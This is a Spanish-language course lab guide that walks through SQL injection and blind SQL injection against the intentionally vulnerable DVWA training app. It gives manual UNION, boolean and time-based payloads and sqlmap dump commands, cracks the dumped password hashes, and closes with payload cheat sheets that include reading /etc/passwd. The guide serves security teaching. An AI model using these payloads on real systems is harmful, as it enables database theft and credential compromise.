# LAB 08 — SQL Injection & SQL Injection (Blind)
**DVWA → SQL Injection → Security Level: Low**
**DVWA → SQL Injection (Blind) → Security Level: Low**

---

## ¿Qué pide el PDF exactamente?

> "Muestre los **comandos** y el proceso para ejecutar un ataque de SQL Injection
> sobre la sección que presenta esta vulnerabilidad."

Debes cubrir **ambas** secciones: SQL Injection normal y SQL Injection (Blind).
El PDF las menciona juntas: `SQL Injection & SQL Injection(Blind)`.

---

## Antes de empezar — checklist

```
[ ] Kali con sesión: danielaguirre@kali:~$
[ ] DVWA logueado en Firefox: admin / password
[ ] Security Level: LOW
[ ] sqlmap instalado: sqlmap --version
[ ] Tienes el PHPSESSID (F12 → Application → Cookies)
```

---

## Razonamiento: ¿cómo funciona la inyección SQL?

El código PHP vulnerable de DVWA nivel Low:
```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($query);
```

Cuando un usuario legítimo escribe `1`, la query queda:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
```

Cuando el atacante escribe `1' OR '1'='1`, la query queda:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```
Como `'1'='1'` siempre es verdadero, devuelve TODOS los usuarios.

Con `UNION SELECT`, el atacante puede obtener datos de cualquier tabla de la BD,
incluyendo usuarios, contraseñas y metadatos del sistema.

---

## SECCIÓN A — SQL Injection (Normal)

### Navegar a la sección

```
http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli/
```

El formulario tiene un campo "User ID" y un botón Submit.
La respuesta muestra: `First name:` / `Surname:` del usuario encontrado.

---

### Paso 1 — Confirmar la vulnerabilidad

Escribe en el campo User ID:
```
'
```
(solo una comilla simple)

Respuesta esperada:
```
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''1'' at line 1
```

Esto confirma dos cosas:
1. El input se concatena directamente en la query SQL
2. Los errores de MySQL son visibles al usuario (facilita la enumeración)

📸 **CAPTURA 1:** El error SQL visible en la página de DVWA.

### Paso 2 — Extraer todos los usuarios (bypass de WHERE)

```
1' OR '1'='1
```

La query resultante devuelve todos los registros de la tabla:
```
ID: 1' OR '1'='1
First name: admin
Surname: admin
...
(todos los usuarios)
```

### Paso 3 — Determinar número de columnas (necesario para UNION)

```
1' ORDER BY 1-- -
```
Si no da error → la query tiene al menos 1 columna.

```
1' ORDER BY 2-- -
```
Si no da error → al menos 2 columnas.

```
1' ORDER BY 3-- -
```
Si da error → la query tiene exactamente **2 columnas**.

> **¿Por qué `-- -` y no solo `--`?**
> El doble guión `--` es el comentario en MySQL. El espacio y el guión extra
> `-- -` aseguran que el comentario sea reconocido correctamente por el parser.
> También puedes usar `#` como comentario en MySQL.

### Paso 4 — Confirmar columnas visibles (UNION SELECT)

```
1' UNION SELECT NULL, NULL-- -
```
Si no hay error, ambas columnas son usables con UNION.

```
1' UNION SELECT 'test_col1', 'test_col2'-- -
```
Respuesta incluye:
```
First name: test_col1
Surname: test_col2
```
Confirmado: la primera columna aparece en "First name" y la segunda en "Surname".

📸 **CAPTURA 2:** UNION SELECT mostrando `test_col1` y `test_col2`.

### Paso 5 — Extraer información de la base de datos

```
1' UNION SELECT database(), version()-- -
```
Respuesta:
```
First name: dvwa          ← nombre de la BD actual
Surname: 5.0.51a-3ubuntu5  ← versión de MySQL
```

📸 **CAPTURA 3:** Nombre de la BD y versión del servidor MySQL.

### Paso 6 — Enumerar todas las tablas de la BD

```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- -
```
Respuesta:
```
First name: guestbook    ← tabla 1
Surname: dvwa

First name: users        ← tabla 2
Surname: dvwa
```

> **¿Qué es `information_schema`?**
> Es una base de datos especial de MySQL (solo lectura) que contiene metadatos:
> nombres de todas las BDs, tablas, columnas, tipos de datos. Es el "mapa" de la BD.
> Todo atacante SQLi lo consulta primero para orientarse.

### Paso 7 — Enumerar columnas de la tabla `users`

```
1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users'-- -
```
Respuesta:
```
First name: user_id     Surname: users
First name: first_name  Surname: users
First name: last_name   Surname: users
First name: user        Surname: users
First name: password    Surname: users
First name: avatar      Surname: users
```

Las columnas `user` y `password` son el objetivo.

### Paso 8 — Extraer todos los usuarios y contraseñas

```
1' UNION SELECT user, password FROM users-- -
```
Respuesta:
```
First name: admin   Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb Surname: e99a18c428cb38d5f260853678922e03
First name: 1337    Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo   Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy  Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

📸 **CAPTURA 4:** Los 5 usuarios con sus hashes MD5 extraídos del servidor.

### Paso 9 — Crackear los hashes MD5

**Opción A — Online (CrackStation):**
Abre `https://crackstation.net/` y pega los hashes uno por uno.

**Opción B — En Kali con hashcat:**
```bash
# Guardar los hashes en un archivo
danielaguirre@kali:~$ cat > hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
EOF

# Crackear con hashcat (modo MD5) y rockyou
danielaguirre@kali:~$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Opción C — En Kali con john:**
```bash
danielaguirre@kali:~$ john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultados esperados:
```
5f4dcc3b5aa765d61d8327deb882cf99 → password
e99a18c428cb38d5f260853678922e03 → abc123
0d107d09f5bbe40cade3de5c71e9e9b7 → letmein
```

📸 **CAPTURA 5:** hashcat o john mostrando las contraseñas crackeadas.

---

## SECCIÓN B — sqlmap (Automatización completa)

sqlmap detecta el tipo de inyección, extrae la BD completa y crackea hashes
de forma automática con un solo comando.

### Paso 10 — Obtener el PHPSESSID

F12 → Application → Cookies → copiar el valor de `PHPSESSID`.
Ejemplo: `abc123xyz789`

### Paso 11 — Detectar vulnerabilidad y enumerar BDs

```bash
danielaguirre@kali:~$ sqlmap \
  -u "http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz789; security=low" \
  --dbs \
  --batch
```

- `--dbs` → enumera todas las bases de datos del servidor
- `--batch` → responde "sí" automáticamente a todas las preguntas interactivas

Resultado:
```
available databases [3]:
[*] dvwa
[*] information_schema
[*] mysql
```

### Paso 12 — Enumerar tablas de la BD `dvwa`

```bash
danielaguirre@kali:~$ sqlmap \
  -u "http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz789; security=low" \
  -D dvwa --tables \
  --batch
```

### Paso 13 — Volcar tabla `users` (incluyendo crackeo de hashes)

```bash
danielaguirre@kali:~$ sqlmap \
  -u "http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz789; security=low" \
  -D dvwa -T users --dump \
  --batch
```

sqlmap detecta automáticamente que los valores de `password` son hashes MD5 e
intenta crackearlos con su diccionario interno.

📸 **CAPTURA 6:** sqlmap mostrando la tabla users volcada con contraseñas crackeadas.

---

## SECCIÓN C — SQL Injection (Blind)

### Navegar a la sección Blind

```
http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli_blind/
```

La diferencia con SQL Injection normal: la aplicación **no muestra datos** de
la query. Solo responde con dos mensajes posibles:
- `User ID exists in the database.` → la condición fue VERDADERA
- `User ID is MISSING from the database.` → la condición fue FALSA

El atacante infiere datos haciendo preguntas verdadero/falso.

### Paso 14 — Confirmar que existe el blind SQLi

```
1' AND '1'='1
```
Respuesta: `User ID exists in the database.` (verdadero)

```
1' AND '1'='2
```
Respuesta: `User ID is MISSING from the database.` (falso)

Confirmado: la aplicación responde diferente según la condición booleana.

📸 **CAPTURA 7:** Las dos respuestas distintas mostrando el comportamiento blind.

### Paso 15 — Técnica Boolean-Based: inferir nombre de la BD

La lógica: preguntar carácter por carácter si el nombre de la BD comienza con X.

```
# ¿La BD empieza con 'd'?
1' AND SUBSTRING(database(),1,1)='d'-- -
→ "exists" = SÍ, el primer carácter es 'd'

# ¿El segundo carácter es 'v'?
1' AND SUBSTRING(database(),2,1)='v'-- -
→ "exists" = SÍ

# ¿El tercero es 'w'?
1' AND SUBSTRING(database(),3,1)='w'-- -
→ "exists" = SÍ

# ¿El cuarto es 'a'?
1' AND SUBSTRING(database(),4,1)='a'-- -
→ "exists" = SÍ
```
Resultado: la BD se llama `dvwa` (reconstruida carácter por carácter).

```
# ¿Cuántos usuarios hay en la tabla users?
1' AND (SELECT COUNT(*) FROM users)=5-- -
→ "exists" = Sí, hay exactamente 5 usuarios
```

### Paso 16 — Técnica Time-Based (alternativa cuando no hay diferencia visible)

Si la aplicación siempre devolviera el mismo mensaje, puedes usar el tiempo:
```
# Si la BD empieza con 'd', el servidor tarda 5 segundos en responder
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)-- -
```
Si la respuesta tarda ~5 segundos → la condición es verdadera.
Si responde inmediatamente → la condición es falsa.

📸 **CAPTURA 8:** Payload time-based con SLEEP(5) — muestra en el navegador el
tiempo de carga (puedes usar F12 → Network para ver los milisegundos de respuesta).

### Paso 17 — sqlmap para Blind (automatización)

Hacer todo esto manualmente tomaría horas. sqlmap lo automatiza:

```bash
danielaguirre@kali:~$ sqlmap \
  -u "http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz789; security=low" \
  --technique=B \
  -D dvwa -T users --dump \
  --batch
```

- `--technique=B` → fuerza la técnica Boolean-based blind
- `--technique=T` → fuerza Time-based blind
- Sin `--technique` sqlmap detecta automáticamente la mejor técnica disponible

```bash
# Para usar específicamente time-based
danielaguirre@kali:~$ sqlmap \
  -u "http://<IP_VICTIMA>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123xyz789; security=low" \
  --technique=T \
  -D dvwa -T users --dump \
  --batch
```

📸 **CAPTURA 9:** sqlmap extrayendo datos de la sección blind con el progreso visible.

---

## Referencia rápida de todos los payloads

### SQLi Manual — cheatsheet

```sql
-- Confirmar vulnerabilidad
'

-- Bypass WHERE (todos los registros)
1' OR '1'='1

-- Determinar columnas
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -    ← este falla si hay 2 columnas

-- Identificar columnas visibles
1' UNION SELECT 'A','B'-- -

-- Fingerprint de la BD
1' UNION SELECT database(), version()-- -
1' UNION SELECT user(), @@datadir-- -

-- Enumerar tablas
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- Enumerar columnas de una tabla
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Extraer datos
1' UNION SELECT user, password FROM users-- -

-- Leer archivo del sistema (si el usuario MySQL tiene permisos FILE)
1' UNION SELECT LOAD_FILE('/etc/passwd'), NULL-- -
```

### SQLi Blind — cheatsheet

```sql
-- Confirmar blind
1' AND '1'='1       → exists
1' AND '1'='2       → missing

-- Inferir nombre de BD carácter por carácter
1' AND SUBSTRING(database(),1,1)='d'-- -

-- Inferir longitud de un valor
1' AND LENGTH(database())=4-- -

-- Contar registros
1' AND (SELECT COUNT(*) FROM users)=5-- -

-- Time-based: condición verdadera → retraso de N segundos
1' AND IF(condición, SLEEP(5), 0)-- -
```

### sqlmap — comandos esenciales

```bash
# Enumerar BDs
sqlmap -u "URL" --cookie="COOKIE" --dbs --batch

# Enumerar tablas de una BD
sqlmap -u "URL" --cookie="COOKIE" -D dvwa --tables --batch

# Volcar tabla completa
sqlmap -u "URL" --cookie="COOKIE" -D dvwa -T users --dump --batch

# Solo blind boolean
sqlmap -u "URL" --cookie="COOKIE" --technique=B --dump --batch

# Solo time-based
sqlmap -u "URL" --cookie="COOKIE" --technique=T --dump --batch

# Más agresivo (más hilos, más intentos)
sqlmap -u "URL" --cookie="COOKIE" --dump --batch --level=3 --risk=2
```

---

## Troubleshooting

| Problema | Causa | Solución |
|---|---|---|
| `'` no da error SQL | Security Level no es Low | DVWA Security → Low → Submit |
| UNION SELECT da error | Número de columnas incorrecto | Ajustar con ORDER BY primero |
| sqlmap dice "not injectable" | Cookie incorrecta | Actualizar PHPSESSID con F12 |
| Blind no diferencia respuestas | Payload incorrecto | Verificar con `1' AND '1'='1` y `1' AND '1'='2` |
| hashcat muy lento en VM | Sin GPU disponible | Usar john o CrackStation online para MD5 |
| sqlmap muy lento en blind | Normal — es carácter por carácter | Agregar `--threads=5` para acelerar |

---

## Capturas mínimas para el informe

| # | Sección | Contenido |
|---|---|---|
| 1 | SQLi Normal | Error SQL con `'` solo — confirma vulnerabilidad |
| 2 | SQLi Normal | UNION SELECT mostrando columnas visibles |
| 3 | SQLi Normal | `database()` y `version()` extraídos |
| 4 | **SQLi Normal** | **Tabla users con usuarios y hashes — captura principal** |
| 5 | SQLi Normal | sqlmap volcando la tabla users completa |
| 6 | **SQLi Blind** | **Las dos respuestas distintas (exists vs missing)** |
| 7 | SQLi Blind | Payload boolean-based o time-based ejecutado |
| 8 | SQLi Blind | sqlmap extrayendo datos del endpoint blind |
